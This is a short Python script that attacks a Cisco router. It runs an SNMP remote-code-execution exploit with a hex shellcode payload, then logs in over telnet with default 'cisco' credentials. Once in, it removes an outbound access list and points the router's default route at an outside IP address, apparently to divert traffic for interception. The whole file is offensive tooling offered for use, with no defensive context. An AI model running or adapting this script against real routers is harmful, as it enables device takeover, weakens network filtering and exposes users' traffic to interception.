from doTelnet import doTelnet

import os

owd = os.getcwd()
if(os.path.isfile('ipAd.txt')):
    with open('ipAd.txt', 'r') as myfile:
        ipAd = myfile.read().replace('\n', '')
else:
    ipAd = raw_input("What is the IP of the router?\n>")

telnet = doTelnet(ipAd,23,"cisco","cisco")

os.chdir(owd + "/cisco-snmp-rce")
os.system("c2800nm-adventerprisek9-mz.151-4.M12a.py %s public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000" % ipAd)
os.chdir(owd)

telnet.connect()
telnet.login()
telnet.getStatus()
telnet.cmd("enable")
telnet.cmd("cisco")
telnet.cmd("conf t")
telnet.cmd("no ip access-group 101 out")
telnet.cmd("ip route 0.0.0.0 0.0.0.0 195.20.52.49")
telnet.close()
